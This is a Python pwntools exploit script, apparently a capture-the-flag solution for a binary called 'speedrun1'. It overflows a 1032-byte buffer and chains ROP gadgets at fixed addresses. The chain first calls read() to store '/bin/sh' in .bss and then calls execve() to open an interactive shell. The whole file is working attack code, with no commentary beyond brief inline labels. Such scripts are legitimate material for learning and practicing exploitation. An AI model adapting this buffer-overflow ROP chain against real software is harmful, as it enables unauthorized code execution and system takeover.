#!/usr/bin/python

from pwn import *

p = process("./speedrun1")

pop_rax = 0x415664
pop_rdi = 0x400686
pop_rsi = 0x4101f3
pop_rdx = 0x44be16
syscall_addr = 0x474e65
bss_addr = 0x6bb2e0

payload = b""

payload += b"A" * 1032

#RAX = 0, read() .bss and "/bin/sh"
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss_addr)
payload += p64(pop_rdx)
payload += p64(len("/bin/sh\x00"))
payload += p64(syscall_addr)

#RAX = 59, execve() , get shell
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall_addr)

p.readuntil(b"words?\n")
p.send(payload)
p.send(b"/bin/sh\x00")

p.interactive()
